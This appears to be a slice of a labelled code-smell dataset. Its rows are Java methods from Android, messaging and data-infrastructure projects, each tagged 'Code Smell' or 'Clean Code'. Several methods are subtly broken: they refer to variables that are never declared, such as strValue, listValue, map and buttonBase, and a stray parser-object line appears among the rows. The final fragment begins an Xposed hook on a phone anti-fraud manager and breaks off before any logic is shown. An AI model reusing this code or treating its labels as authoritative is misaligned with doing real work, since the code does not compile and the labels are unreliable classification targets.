      EventBus.getDefault().post(new RefreshEvent(RefreshEvent.TYPE_SEARCH_RESULT,data));
    }
 else     if (quickSearchResult == result) {
      EventBus.getDefault().post(new RefreshEvent(RefreshEvent.TYPE_QUICK_SEARCH_RESULT,data));
    }
 else     if (result != null) {
      if (result == detailResult) {
        checkThunder(data);
      }
 else {
        result.postValue(data);
      }
    }
    return data;
  }
 catch (  Exception e) {
    if (searchResult == result) {
      EventBus.getDefault().post(new RefreshEvent(RefreshEvent.TYPE_SEARCH_RESULT,null));
    }
 else     if (quickSearchResult == result) {
      EventBus.getDefault().post(new RefreshEvent(RefreshEvent.TYPE_QUICK_SEARCH_RESULT,null));
    }
 else     if (result != null) {
      result.postValue(null);
    }
    return null;
  }
}",1,Code Smell
"JsonObject send(String cmd,Map<String,Object> args) throws CardException {
  Map<String,Object> sendMap=new LinkedHashMap<>();
  sendMap.put(""cmd"",cmd);
  sendMap.putAll(args);
  ByteArrayOutputStream baos=new ByteArrayOutputStream();
  MapBuilder<CborBuilder> cborBuilder=new CborBuilder().addMap();
  for (  Map.Entry<String,Object> entry : sendMap.entrySet()) {
    if (entry.getValue() instanceof String) {
      cborBuilder.put(entry.getKey(),strValue);
    }
 else     if (entry.getValue() instanceof byte[]) {
      cborBuilder.put(entry.getKey(),byteValue);
    }
 else     if (entry.getValue() instanceof Long) {
      cborBuilder.put(entry.getKey(),longValue);
    }
 else     if (entry.getValue() instanceof Integer) {
      cborBuilder.put(entry.getKey(),integerValue);
    }
 else     if (entry.getValue() instanceof Boolean) {
      cborBuilder.put(entry.getKey(),booleanValue);
    }
 else     if (entry.getValue() instanceof List<?>) {
      ArrayBuilder<MapBuilder<CborBuilder>> arrayBuilder=cborBuilder.putArray(entry.getKey());
      for (      Object value : listValue) {
        if (value instanceof String) {
          arrayBuilder.add(strValue);
        }
 else         if (value instanceof byte[]) {
          arrayBuilder.add(byteValue);
        }
 else         if (value instanceof Long) {
          arrayBuilder.add(longValue);
        }
 else         if (value instanceof Boolean) {
          arrayBuilder.add(booleanValue);
        }
      }
      arrayBuilder.end();
    }
  }
  try {
    new CborEncoder(baos).encode(cborBuilder.end().build());
    byte[] sendBytes=baos.toByteArray();
    CardChannel cardChannel=connection.getBasicChannel();
    ResponseAPDU resp=cardChannel.transmit(new CommandAPDU(CBOR_CLA,CBOR_INS,0,0,sendBytes));
    if (resp.getSW() != SW_OKAY) {
      throw new CardException(""Received error SW value "" + resp.getSW());
    }
    ByteArrayInputStream bais=new ByteArrayInputStream(resp.getData());
    List<DataItem> dataItems=new CborDecoder(bais).decode();
    for (    DataItem dataItem : dataItems) {
      if (dataItem instanceof co.nstant.in.cbor.model.Map) {
        JsonObject result=new JsonObject();
        for (        DataItem key : map.getKeys()) {
          String strKey=key.toString();
          result.add(strKey,getJsonElement(map.get(key)));
        }
        if (result.get(""error"") != null) {
          String msg=result.get(""error"").getAsString();
          int code=result.get(""code"") == null ? 500 : result.get(""code"").getAsInt();
          if (code == 205) {
            throw new CardUnluckyNumberException(""Card chose unlucky number, please retry"");
          }
 else           if (code == 401) {
            throw new CardAuthorizationException(""Incorrect PIN provided"");
          }
          throw new CardException(code + "" on "" + cmd+ "": ""+ msg);
        }
        return result;
      }
    }
  }
 catch (  CborException e) {
    log.error(""CBOR encoding error"",e);
  }
  return new JsonObject();
}",1,Code Smell
"@Override public void saveData(CollectRep.MetricsData metricsData){
  if (!isServerAvailable() || metricsData.getCode() != CollectRep.Code.SUCCESS) {
    return;
  }
  if (metricsData.getValuesList().isEmpty()) {
    log.info(""[warehouse influxdb] flush metrics data {} is null, ignore."",metricsData.getId());
    return;
  }
  List<CollectRep.Field> fieldsList=metricsData.getFieldsList();
  String table=this.generateTable(metricsData.getApp(),metricsData.getMetrics(),metricsData.getId());
  List<Point> points=new ArrayList<>();
  for (  CollectRep.ValueRow valueRow : metricsData.getValuesList()) {
    Point.Builder builder=Point.measurement(table);
    builder.time(metricsData.getTime(),TimeUnit.MILLISECONDS);
    Map<String,String> labels=new HashMap<>(8);
    for (int i=0; i < fieldsList.size(); i++) {
      CollectRep.Field field=fieldsList.get(i);
      if (!CommonConstants.NULL_VALUE.equals(valueRow.getColumns(i))) {
        if (field.getType() == CommonConstants.TYPE_NUMBER) {
          builder.addField(field.getName(),Double.parseDouble(valueRow.getColumns(i)));
        }
 else         if (field.getType() == CommonConstants.TYPE_STRING) {
          builder.addField(field.getName(),valueRow.getColumns(i));
        }
        if (field.getLabel()) {
          labels.put(field.getName(),valueRow.getColumns(i));
        }
      }
 else {
        builder.addField(field.getName(),"""");
      }
    }
    builder.tag(""instance"",JsonUtil.toJson(labels));
    points.add(builder.build());
  }
  BatchPoints.Builder builder=BatchPoints.database(DATABASE);
  builder.points(points);
  this.influxDb.write(builder.build());
}",1,Code Smell
"protected void drop(DropTarget dropTarget,Runnable flingAnimation){
  final int[] coordinates=mCoordinatesTemp;
  mDragObject.x=coordinates[0];
  mDragObject.y=coordinates[1];
  if (dropTarget != mLastDropTarget) {
    if (mLastDropTarget != null) {
      mLastDropTarget.onDragExit(mDragObject);
    }
    mLastDropTarget=dropTarget;
    if (dropTarget != null) {
      dropTarget.onDragEnter(mDragObject);
    }
  }
  mDragObject.dragComplete=true;
  if (mIsInPreDrag) {
    if (dropTarget != null) {
      dropTarget.onDragExit(mDragObject);
    }
    return;
  }
  boolean accepted=false;
  if (dropTarget != null) {
    dropTarget.onDragExit(mDragObject);
    if (dropTarget.acceptDrop(mDragObject)) {
      if (flingAnimation != null) {
        flingAnimation.run();
      }
 else {
        dropTarget.onDrop(mDragObject,mOptions);
      }
      accepted=true;
    }
  }
  final View dropTargetAsView=dropTarget instanceof View ? (View)dropTarget : null;
  dispatchDropComplete(dropTargetAsView,accepted);
}",1,Code Smell
"/** 
 * send
 */
public boolean send(PackProfile profile){
  String topic=null;
  try {
    IdTopicConfig idConfig=ConfigManager.getInstance().getSinkIdTopicConfig(profile.getInlongGroupId(),profile.getInlongStreamId());
    if (idConfig == null) {
      if (CommonConfigHolder.getInstance().isEnableUnConfigTopicAccept()) {
        topic=CommonConfigHolder.getInstance().getRandDefTopics();
        if (StringUtils.isEmpty(topic)) {
          sinkContext.fileMetricIncWithDetailStats(StatConstants.EVENT_SINK_DEFAULT_TOPIC_MISSING,profile.getUid());
          sinkContext.addSendResultMetric(profile,clusterName,profile.getUid(),false,0);
          sinkContext.getMqZoneSink().releaseAcquiredSizePermit(profile);
          profile.fail(DataProxyErrCode.GROUPID_OR_STREAMID_NOT_CONFIGURE,"""");
          return false;
        }
        sinkContext.fileMetricIncWithDetailStats(StatConstants.EVENT_SINK_DEFAULT_TOPIC_USED,profile.getUid());
      }
 else {
        sinkContext.fileMetricIncWithDetailStats(StatConstants.EVENT_SINK_CONFIG_TOPIC_MISSING,profile.getUid());
        sinkContext.addSendResultMetric(profile,clusterName,profile.getUid(),false,0);
        sinkContext.getMqZoneSink().releaseAcquiredSizePermit(profile);
        profile.fail(DataProxyErrCode.GROUPID_OR_STREAMID_NOT_CONFIGURE,"""");
        return false;
      }
    }
 else {
      topic=idConfig.getTopicName();
    }
    if (producer == null) {
      sinkContext.fileMetricIncWithDetailStats(StatConstants.EVENT_SINK_PRODUCER_NULL,topic);
      sinkContext.processSendFail(profile,clusterName,topic,0,DataProxyErrCode.PRODUCER_IS_NULL,"""");
      return false;
    }
    if (!this.topicSet.contains(topic)) {
      this.producer.publish(topic);
      this.topicSet.add(topic);
    }
    if (profile instanceof SimplePackProfile) {
      this.sendSimplePackProfile((SimplePackProfile)profile,idConfig,topic);
    }
 else {
      this.sendBatchPackProfile((BatchPackProfile)profile,idConfig,topic);
    }
    return true;
  }
 catch (  Throwable ex) {
    sinkContext.fileMetricIncWithDetailStats(StatConstants.EVENT_SINK_SEND_EXCEPTION,topic);
    sinkContext.processSendFail(profile,clusterName,profile.getUid(),0,DataProxyErrCode.SEND_REQUEST_TO_MQ_FAILURE,ex.getMessage());
    if (logCounter.shouldPrint()) {
      logger.error(""Send Message to Tube failure"",ex);
    }
    return false;
  }
}",1,Code Smell
"@Override public boolean equals(Object o){
  if (this == o)   return true;
  if (o == null || getClass() != o.getClass())   return false;
  HevcDecoderConfigurationRecord that=(HevcDecoderConfigurationRecord)o;
  if (avgFrameRate != that.avgFrameRate)   return false;
  if (bitDepthChromaMinus8 != that.bitDepthChromaMinus8)   return false;
  if (bitDepthLumaMinus8 != that.bitDepthLumaMinus8)   return false;
  if (chromaFormat != that.chromaFormat)   return false;
  if (configurationVersion != that.configurationVersion)   return false;
  if (constantFrameRate != that.constantFrameRate)   return false;
  if (general_constraint_indicator_flags != that.general_constraint_indicator_flags)   return false;
  if (general_level_idc != that.general_level_idc)   return false;
  if (general_profile_compatibility_flags != that.general_profile_compatibility_flags)   return false;
  if (general_profile_idc != that.general_profile_idc)   return false;
  if (general_profile_space != that.general_profile_space)   return false;
  if (general_tier_flag != that.general_tier_flag)   return false;
  if (lengthSizeMinusOne != that.lengthSizeMinusOne)   return false;
  if (min_spatial_segmentation_idc != that.min_spatial_segmentation_idc)   return false;
  if (numTemporalLayers != that.numTemporalLayers)   return false;
  if (parallelismType != that.parallelismType)   return false;
  if (reserved1 != that.reserved1)   return false;
  if (reserved2 != that.reserved2)   return false;
  if (reserved3 != that.reserved3)   return false;
  if (reserved4 != that.reserved4)   return false;
  if (reserved5 != that.reserved5)   return false;
  if (temporalIdNested != that.temporalIdNested)   return false;
  if (arrays != null ? !arrays.equals(that.arrays) : that.arrays != null)   return false;
  return true;
}
@Override public boolean equals(Object o){
  if (this == o)   return true;
  if (o == null || getClass() != o.getClass())   return false;
  Array array=(Array)o;
  if (array_completeness != array.array_completeness)   return false;
  if (nal_unit_type != array.nal_unit_type)   return false;
  if (reserved != array.reserved)   return false;
  ListIterator<byte[]> e1=nalUnits.listIterator();
  ListIterator<byte[]> e2=(array.nalUnits).listIterator();
  while (e1.hasNext() && e2.hasNext()) {
    byte[] o1=e1.next();
    byte[] o2=e2.next();
    if (!(o1 == null ? o2 == null : Arrays.equals(o1,o2)))     return false;
  }
  return !(e1.hasNext() || e2.hasNext());
}",1,Code Smell
"private void updateRecognizedBounds(RectF newBounds,PointF[] newPoints){
  final long now=SystemClock.elapsedRealtime();
  if (lastBoundsUpdate == 0) {
    lastBoundsUpdate=now - boundsUpdateDuration;
    bounds.set(newBounds);
    fromBounds.set(newBounds);
    if (newPoints == null) {
      setPointsFromBounds(newBounds,fromPoints);
      setPointsFromBounds(newBounds,points);
    }
 else {
      for (int i=0; i < 4; i++) {
        fromPoints[i].set(newPoints[i].x,newPoints[i].y);
        points[i].set(newPoints[i].x,newPoints[i].y);
      }
    }
  }
 else {
    if (fromBounds != null && now - lastBoundsUpdate < boundsUpdateDuration) {
      float t=(now - lastBoundsUpdate) / (float)boundsUpdateDuration;
      t=Math.min(1,Math.max(0,t));
      AndroidUtilities.lerp(fromBounds,bounds,t,fromBounds);
      for (int i=0; i < 4; ++i) {
        fromPoints[i].set(AndroidUtilities.lerp(fromPoints[i].x,points[i].x,t),AndroidUtilities.lerp(fromPoints[i].y,points[i].y,t));
      }
    }
 else {
      fromBounds.set(bounds);
      for (int i=0; i < 4; ++i) {
        fromPoints[i].set(points[i].x,points[i].y);
      }
    }
    bounds.set(newBounds);
    if (newPoints == null) {
      setPointsFromBounds(bounds,points);
    }
 else {
      for (int i=0; i < 4; ++i) {
        points[i].set(newPoints[i].x,newPoints[i].y);
      }
    }
    lastBoundsUpdate=now;
  }
  fragmentView.invalidate();
}",1,Code Smell
"public static NativeImage scaleBilinear(NativeImage image,int newWidth,int newHeight){
  NativeImage scaled=new NativeImage(image.format(),newWidth,newHeight,false);
  float xScale=(float)newWidth / image.getWidth();
  float yScale=(float)newHeight / image.getHeight();
  for (int y=0; y < newHeight; ++y) {
    for (int x=0; x < newWidth; ++x) {
      float unscaledX=(x + 0.5f) / xScale;
      float unscaledY=(y + 0.5f) / yScale;
      int x1=Math.round(unscaledX);
      int y1=Math.round(unscaledY);
      int x0=x1 - 1;
      int y0=y1 - 1;
      boolean x0valid=true;
      boolean y0valid=true;
      boolean x1valid=true;
      boolean y1valid=true;
      if (x0 < 0) {
        x0valid=false;
      }
      if (y0 < 0) {
        y0valid=false;
      }
      if (x1 >= image.getWidth()) {
        x1valid=false;
      }
      if (y1 >= image.getHeight()) {
        y1valid=false;
      }
      int finalColor=0;
      if (x0valid & y0valid & x1valid& y1valid) {
        float leftWeight=(x1 + 0.5f) - unscaledX;
        float rightWeight=unscaledX - (x0 + 0.5f);
        float topWeight=(y1 + 0.5f) - unscaledY;
        float bottomWeight=unscaledY - (y0 + 0.5f);
        float weightTL=leftWeight * topWeight;
        float weightTR=rightWeight * topWeight;
        float weightBL=leftWeight * bottomWeight;
        float weightBR=rightWeight * bottomWeight;
        int colorTL=image.getPixelRGBA(x0,y0);
        int colorTR=image.getPixelRGBA(x1,y0);
        int colorBL=image.getPixelRGBA(x0,y1);
        int colorBR=image.getPixelRGBA(x1,y1);
        finalColor=blendColor(colorTL,colorTR,colorBL,colorBR,weightTL,weightTR,weightBL,weightBR);
      }
 else       if (x0valid & x1valid) {
        float leftWeight=(x1 + 0.5f) - unscaledX;
        float rightWeight=unscaledX - (x0 + 0.5f);
        int validY=y0valid ? y0 : y1;
        int colorLeft=image.getPixelRGBA(x0,validY);
        int colorRight=image.getPixelRGBA(x1,validY);
        finalColor=blendColor(colorLeft,colorRight,leftWeight,rightWeight);
      }
 else       if (y0valid & y1valid) {
        float topWeight=(y1 + 0.5f) - unscaledY;
        float bottomWeight=unscaledY - (y0 + 0.5f);
        int validX=x0valid ? x0 : x1;
        int colorTop=image.getPixelRGBA(validX,y0);
        int colorBottom=image.getPixelRGBA(validX,y1);
        finalColor=blendColor(colorTop,colorBottom,topWeight,bottomWeight);
      }
 else {
        finalColor=image.getPixelRGBA(x0valid ? x0 : x1,y0valid ? y0 : y1);
      }
      scaled.setPixelRGBA(x,y,finalColor);
    }
  }
  return scaled;
}",1,Code Smell
"@Override public long getFilesSize(String path){
  long ftpFileSize=0;
  if (StringUtils.isBlank(path)) {
    path=SP;
  }
  List<String> sources=new ArrayList<>();
  if (isDirExist(path)) {
    if (path.equals(DOT)) {
      return 0;
    }
    if (!path.endsWith(SP)) {
      path=path + SP;
    }
    try {
      Vector vector=channelSftp.ls(path);
      for (int i=0; i < vector.size(); ++i) {
        ChannelSftp.LsEntry le=(ChannelSftp.LsEntry)vector.get(i);
        String strName=le.getFilename();
        if (!strName.equals(DOT) && !strName.equals(DOT_DOT)) {
          String filePath=path + strName;
          ftpFileSize+=getFilesSize(filePath);
        }
      }
    }
 catch (    SftpException e) {
      LOG.error(""Get sftp file size failed due to {}"",e);
    }
  }
 else   if (isFileExist(path)) {
    try {
      SftpATTRS sftpATTRS=channelSftp.lstat(path);
      ftpFileSize+=sftpATTRS.getSize();
    }
 catch (    Exception e) {
      throw BitSailException.asBitSailException(FtpInputFormatErrorCode.CONNECTION_ERROR,String.format(""Get sftp file size failed due to %s"",e.getMessage()));
    }
  }
  return ftpFileSize;
}",1,Code Smell
"@Override public void augment(S struc){
  var currentContextMenu=new AtomicReference<ContextMenu>();
  Supplier<Boolean> hide=() -> {
    if (currentContextMenu.get() != null && currentContextMenu.get().isShowing()) {
      currentContextMenu.get().hide();
      currentContextMenu.set(null);
      return true;
    }
    return false;
  }
;
  var r=struc.get();
  r.addEventHandler(MouseEvent.MOUSE_CLICKED,event -> {
    if (mouseEventCheck != null && mouseEventCheck.test(event)) {
      if (!hide.get()) {
        var cm=contextMenu.get();
        if (cm != null) {
          cm.show(r,event.getScreenX(),event.getScreenY());
          currentContextMenu.set(cm);
        }
      }
      event.consume();
    }
  }
);
  r.addEventHandler(MouseEvent.MOUSE_PRESSED,event -> {
    if (mouseEventCheck != null && mouseEventCheck.test(event)) {
      event.consume();
    }
  }
);
  r.addEventHandler(KeyEvent.KEY_RELEASED,event -> {
    if (keyEventCheck != null && keyEventCheck.test(event)) {
      event.consume();
    }
  }
);
  r.addEventHandler(KeyEvent.KEY_PRESSED,event -> {
    if (keyEventCheck != null && keyEventCheck.test(event)) {
      if (!hide.get()) {
        var cm=contextMenu.get();
        if (cm != null) {
          cm.show(r,Side.BOTTOM,0,0);
          currentContextMenu.set(cm);
        }
      }
      event.consume();
    }
  }
);
  if (r instanceof ButtonBase && keyEventCheck == null) {
    buttonBase.addEventHandler(ActionEvent.ACTION,event -> {
      if (buttonBase.getOnAction() != null) {
        return;
      }
      if (!hide.get()) {
        var cm=contextMenu.get();
        if (cm != null) {
          cm.show(r,Side.BOTTOM,0,0);
          currentContextMenu.set(cm);
        }
      }
      event.consume();
    }
);
  }
}",1,Code Smell
"public static XmlNode parseXml(String filePath){
  try (FileInputStream fis=new FileInputStream(filePath);ByteArrayOutputStream bos=new ByteArrayOutputStream()){
    byte[] buffer=new byte[1024];
    int len=0;
    while ((len=fis.read(buffer)) != -1) {
      bos.write(buffer,0,len);
    }
    return parseXml(bos.toByteArray());
  }
 catch (  Exception e) {
    Log.e(""parse xml error:"" + e);
  }
  return null;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@466d7a40",0,Clean Code
"public void processReadMessages(LongSparseIntArray inbox,long dialogId,int maxDate,int maxId,boolean isPopup){
  ArrayList<MessageObject> popupArrayRemove=new ArrayList<>(0);
  notificationsQueue.postRunnable(() -> {
    if (inbox != null) {
      for (int b=0; b < inbox.size(); b++) {
        long key=inbox.keyAt(b);
        int messageId=inbox.get(key);
        for (int a=0; a < pushMessages.size(); a++) {
          MessageObject messageObject=pushMessages.get(a);
          if (!messageObject.messageOwner.from_scheduled && messageObject.getDialogId() == key && messageObject.getId() <= messageId) {
            if (isPersonalMessage(messageObject)) {
              personalCount--;
            }
            popupArrayRemove.add(messageObject);
            long did;
            if (messageObject.messageOwner.peer_id.channel_id != 0) {
              did=-messageObject.messageOwner.peer_id.channel_id;
            }
 else {
              did=0;
            }
            SparseArray<MessageObject> sparseArray=pushMessagesDict.get(did);
            if (sparseArray != null) {
              sparseArray.remove(messageObject.getId());
              if (sparseArray.size() == 0) {
                pushMessagesDict.remove(did);
              }
            }
            delayedPushMessages.remove(messageObject);
            pushMessages.remove(a);
            a--;
          }
        }
      }
    }
    if (dialogId != 0 && (maxId != 0 || maxDate != 0)) {
      for (int a=0; a < pushMessages.size(); a++) {
        MessageObject messageObject=pushMessages.get(a);
        if (messageObject.getDialogId() == dialogId) {
          boolean remove=false;
          if (maxDate != 0) {
            if (messageObject.messageOwner.date <= maxDate) {
              remove=true;
            }
          }
 else {
            if (!isPopup) {
              if (messageObject.getId() <= maxId || maxId < 0) {
                remove=true;
              }
            }
 else {
              if (messageObject.getId() == maxId || maxId < 0) {
                remove=true;
              }
            }
          }
          if (remove) {
            if (isPersonalMessage(messageObject)) {
              personalCount--;
            }
            long did;
            if (messageObject.messageOwner.peer_id.channel_id != 0) {
              did=-messageObject.messageOwner.peer_id.channel_id;
            }
 else {
              did=0;
            }
            SparseArray<MessageObject> sparseArray=pushMessagesDict.get(did);
            if (sparseArray != null) {
              sparseArray.remove(messageObject.getId());
              if (sparseArray.size() == 0) {
                pushMessagesDict.remove(did);
              }
            }
            pushMessages.remove(a);
            delayedPushMessages.remove(messageObject);
            popupArrayRemove.add(messageObject);
            a--;
          }
        }
      }
    }
    if (!popupArrayRemove.isEmpty()) {
      AndroidUtilities.runOnUIThread(() -> {
        for (int a=0, size=popupArrayRemove.size(); a < size; a++) {
          popupMessages.remove(popupArrayRemove.get(a));
        }
        NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.pushMessagesUpdated);
      }
);
    }
  }
);
}",1,Code Smell
"/** 
 * add collector node
 * @param newNode node
 */
public void addNode(Node newNode){
  if (!CommonConstants.MODE_PRIVATE.equals(newNode.mode)) {
    byte virtualNodeNum=newNode.quality == null ? VIRTUAL_NODE_DEFAULT_SIZE : newNode.quality;
    for (byte i=0; i < virtualNodeNum; i++) {
      int virtualHashKey=hash(newNode.identity + i);
      hashCircle.put(virtualHashKey,newNode);
      newNode.addVirtualNodeJobs(virtualHashKey,ConcurrentHashMap.newKeySet(16));
      Map.Entry<Integer,Node> higherVirtualNode=hashCircle.higherEntry(virtualHashKey);
      if (higherVirtualNode == null) {
        higherVirtualNode=hashCircle.firstEntry();
      }
      Integer higherVirtualNodeKey=higherVirtualNode.getKey();
      Node higherNode=higherVirtualNode.getValue();
      Set<Long[]> dispatchJobs=higherNode.clearVirtualNodeJobs(higherVirtualNodeKey);
      if (dispatchJobs != null && !dispatchJobs.isEmpty()) {
        Set<Long[]> reDispatchJobs=ConcurrentHashMap.newKeySet(dispatchJobs.size());
        Iterator<Long[]> iterator=dispatchJobs.iterator();
        while (iterator.hasNext()) {
          Long[] jobHash=iterator.next();
          int dispatchHash=jobHash[1].intValue();
          if (dispatchHash <= virtualHashKey) {
            reDispatchJobs.add(jobHash);
            iterator.remove();
          }
        }
        higherNode.virtualNodeMap.put(higherVirtualNodeKey,dispatchJobs);
        Set<Long> jobIds=reDispatchJobs.stream().map(item -> item[0]).collect(Collectors.toSet());
        newNode.addVirtualNodeJobs(virtualHashKey,reDispatchJobs);
        if (higherNode != newNode) {
          higherNode.assignJobs.removeAssignJobs(jobIds);
          higherNode.assignJobs.addRemovingJobs(jobIds);
          newNode.assignJobs.addAddingJobs(jobIds);
        }
      }
    }
  }
  existNodeMap.put(newNode.identity,newNode);
  if (!dispatchJobCache.isEmpty()) {
    int size=dispatchJobCache.size();
    for (int index=0; index < size; index++) {
      DispatchJob dispatchJob=dispatchJobCache.remove(0);
      dispatchJob(dispatchJob.dispatchHash,dispatchJob.jobId,false);
    }
  }
}",1,Code Smell
"private MethodEntity getMethodEntity(String className,String methodName,String des){
  Node node=getClassGraph().get(className);
  if (node == null) {
    getLogger().w(""class not found"",String.format(""class %s not found!"",className));
    return null;
  }
  for (  MethodEntity method : node.entity.methods) {
    if (method.name().equals(methodName) && method.desc().equals(des)) {
      return method;
    }
  }
  final Queue<Node> interfaces=new LinkedList<>();
  if (node.interfaces != null) {
    interfaces.addAll(node.interfaces);
  }
  Node parent=node.parent;
  while (parent != null) {
    for (    MethodEntity method : parent.entity.methods) {
      if (method.name().equals(methodName) && method.desc().equals(des)) {
        return method;
      }
    }
    if (parent.interfaces != null) {
      interfaces.addAll(parent.interfaces);
    }
    parent=parent.parent;
  }
  while (!interfaces.isEmpty()) {
    Node aInterface=interfaces.poll();
    for (    MethodEntity method : aInterface.entity.methods) {
      if (method.name().equals(methodName) && method.desc().equals(des)) {
        return method;
      }
    }
    if (aInterface.interfaces != null) {
      interfaces.addAll(aInterface.interfaces);
    }
  }
  return null;
}
",1,Code Smell
"public void notifyHBAck(Channel channel,short loadvalue){
  try {
    if (loadvalue == (-1) || loadCycle == 0) {
      return;
    }
 else {
      for (      Map.Entry<HostInfo,NettyClient> entry : clientMapData.entrySet()) {
        NettyClient client=entry.getValue();
        HostInfo hostInfo=entry.getKey();
        if (client != null && client.getChannel() != null && client.getChannel().id().equals(channel.id())) {
          if (!channelLoadMapData.containsKey(hostInfo)) {
            channelLoadMapData.put(hostInfo,new int[ConfigConstants.CYCLE]);
          }
          if ((loadCycle - 1) >= 0) {
            channelLoadMapData.get(hostInfo)[loadCycle - 1]=loadvalue;
          }
 else {
            return;
          }
          break;
        }
      }
      for (      Map.Entry<HostInfo,NettyClient> entry : clientMapHB.entrySet()) {
        NettyClient client=entry.getValue();
        HostInfo hostInfo=entry.getKey();
        if (client != null && client.getChannel() != null && client.getChannel().id().equals(channel.id())) {
          if (!channelLoadMapHB.containsKey(hostInfo)) {
            channelLoadMapHB.put(hostInfo,new int[ConfigConstants.CYCLE]);
          }
          if ((loadCycle - 1) >= 0) {
            channelLoadMapHB.get(hostInfo)[loadCycle - 1]=loadvalue;
          }
 else {
            return;
          }
          break;
        }
      }
    }
  }
 catch (  Exception e) {
    logger.error(""{} , {}"",e.toString(),e.getStackTrace());
  }
}",1,Code Smell
"/** 
 * remove the consumer and return consumer object, if the consumer is the latest one, then removed the group object
 * @param group group name of consumer
 * @param consumerId consumer id
 * @param isTimeout if timeout
 * @return ConsumerInfo
 */
public ConsumerInfo removeConsumer(String group,String consumerId,boolean isTimeout){
  if (group == null || consumerId == null) {
    return null;
  }
  boolean rmvGroup;
  boolean isCltBal=false;
  ConsumerInfo consumer=null;
  Integer lid=null;
  try {
    lid=groupRowLock.getLock(null,StringUtils.getBytesUtf8(group),true);
    ConsumeGroupInfo consumeGroupInfo=groupInfoMap.get(group);
    if (consumeGroupInfo != null) {
      consumer=consumeGroupInfo.removeConsumer(consumerId);
      if (consumeGroupInfo.isGroupEmpty()) {
        rmvGroup=(groupInfoMap.remove(group) != null);
        if (consumeGroupInfo.isClientBalance()) {
          isCltBal=true;
          clientBalanceGroupSet.remove(group);
        }
 else {
          serverBalanceGroupSet.remove(group);
        }
        ConcurrentHashSet<String> groupSet;
        for (        String topicName : consumeGroupInfo.getTopicSet()) {
          groupSet=topicGroupMap.get(topicName);
          if (groupSet == null) {
            continue;
          }
          groupSet.remove(group);
        }
        if (rmvGroup) {
          if (consumer == null) {
            MasterSrvStatsHolder.decConsumeGroupCnt(isTimeout,isCltBal);
          }
 else {
            MasterSrvStatsHolder.decConsumerCnt(isTimeout,true,isCltBal);
          }
        }
      }
 else {
        if (consumer != null) {
          MasterSrvStatsHolder.decConsumerCnt(isTimeout,false,false);
        }
      }
    }
    consumerIndexMap.remove(consumerId);
  }
 catch (  IOException e) {
    logger.warn(""Failed to lock."",e);
  }
 finally {
    if (lid != null) {
      groupRowLock.releaseRowLock(lid);
    }
  }
  return consumer;
}",1,Code Smell
"private void setPrimaryKey(Table table){
  if (table == null) {
    return;
  }
  List<TableIndex> tableIndices=table.getIndexList();
  if (CollectionUtils.isEmpty(tableIndices)) {
    return;
  }
  List<TableColumn> columns=table.getColumnList();
  if (CollectionUtils.isEmpty(columns)) {
    return;
  }
  Map<String,TableColumn> columnMap=columns.stream().collect(Collectors.toMap(TableColumn::getName,Function.identity()));
  List<TableIndex> indexes=new ArrayList<>();
  for (  TableIndex tableIndex : tableIndices) {
    if (""Primary"".equalsIgnoreCase(tableIndex.getType())) {
      List<TableIndexColumn> indexColumns=tableIndex.getColumnList();
      if (CollectionUtils.isNotEmpty(indexColumns)) {
        for (        TableIndexColumn indexColumn : indexColumns) {
          TableColumn column=columnMap.get(indexColumn.getColumnName());
          if (column != null) {
            column.setPrimaryKey(true);
            column.setPrimaryKeyOrder(indexColumn.getOrdinalPosition());
            column.setPrimaryKeyName(tableIndex.getName());
          }
        }
      }
    }
 else {
      indexes.add(tableIndex);
    }
  }
  table.setIndexList(indexes);
}
",1,Code Smell
"public void applyDotState(ItemInfo itemInfo,boolean animate){
  if (mIcon instanceof FastBitmapDrawable) {
    boolean wasDotted=mDotInfo != null;
    mDotInfo=mActivity.getDotInfoForItem(itemInfo);
    boolean isDotted=mDotInfo != null;
    float newDotScale=isDotted ? 1f : 0;
    if (mDisplay == DISPLAY_ALL_APPS) {
      mDotRenderer=mActivity.getDeviceProfile().mDotRendererAllApps;
    }
 else {
      mDotRenderer=mActivity.getDeviceProfile().mDotRendererWorkSpace;
    }
    if (wasDotted || isDotted) {
      if (animate && (wasDotted ^ isDotted) && isShown()) {
        animateDotScale(newDotScale);
      }
 else {
        cancelDotScaleAnim();
        mDotParams.scale=newDotScale;
        invalidate();
      }
    }
    if (!TextUtils.isEmpty(itemInfo.contentDescription)) {
      if (itemInfo.isDisabled()) {
        setContentDescription(getContext().getString(R.string.disabled_app_label,itemInfo.contentDescription));
      }
 else       if (hasDot()) {
        int count=mDotInfo.getNotificationCount();
        setContentDescription(getAppLabelPluralString(itemInfo.contentDescription.toString(),count));
      }
 else {
        setContentDescription(itemInfo.contentDescription);
      }
    }
  }
}",1,Code Smell
"@Override public void onItemClick(int id){
  if (id == -1) {
    if (sharedMediaLayout.closeActionMode(true)) {
      return;
    }
    finishFragment();
  }
 else   if (id == 2) {
    if (actionModeMessageObjects != null) {
      ArrayList<TL_stories.StoryItem> storyItems=new ArrayList<>();
      for (int i=0; i < actionModeMessageObjects.size(); ++i) {
        MessageObject messageObject=actionModeMessageObjects.valueAt(i);
        if (messageObject.storyItem != null) {
          storyItems.add(messageObject.storyItem);
        }
      }
      if (!storyItems.isEmpty()) {
        AlertDialog.Builder builder=new AlertDialog.Builder(getContext(),getResourceProvider());
        builder.setTitle(storyItems.size() > 1 ? LocaleController.getString(""DeleteStoriesTitle"",R.string.DeleteStoriesTitle) : LocaleController.getString(""DeleteStoryTitle"",R.string.DeleteStoryTitle));
        builder.setMessage(LocaleController.formatPluralString(""DeleteStoriesSubtitle"",storyItems.size()));
        builder.setPositiveButton(LocaleController.getString(""Delete"",R.string.Delete),new DialogInterface.OnClickListener(){
          @Override public void onClick(          DialogInterface dialog,          int which){
            getMessagesController().getStoriesController().deleteStories(dialogId,storyItems);
            sharedMediaLayout.closeActionMode(false);
          }
        }
);
        builder.setNegativeButton(LocaleController.getString(""Cancel"",R.string.Cancel),(DialogInterface.OnClickListener)(dialog,which) -> {
          dialog.dismiss();
        }
);
        AlertDialog dialog=builder.create();
        dialog.show();
        dialog.redPositive();
      }
    }
  }
 else   if (id == 10) {
    sharedMediaLayout.showMediaCalendar(sharedMediaLayout.getClosestTab(),false);
  }
 else   if (id == 11) {
    sharedMediaLayout.closeActionMode(true);
    sharedMediaLayout.getSearchItem().openSearch(false);
  }
}",1,Code Smell
"@Override protected void beforeHookedMethod(MethodHookParam methodHookParam) throws Throwable {
  List list=(List)methodHookParam.args[0];
  String MIUI_VERSION=null;
  Field[] antiDefraudAppManagerFields=antiDefraudAppManager.getDeclaredFields();
